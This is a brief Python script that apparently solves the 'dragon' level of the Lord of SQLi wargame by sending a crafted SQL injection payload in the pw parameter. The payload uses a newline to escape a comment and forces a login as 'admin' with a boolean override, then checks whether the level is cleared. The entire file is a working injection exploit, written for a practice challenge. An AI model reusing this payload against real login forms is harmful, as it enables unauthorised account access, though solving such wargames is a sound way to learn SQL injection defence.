from constants import *

chall_url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"

res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"\n and False or id='admin' -- -"))
check_clear(res)
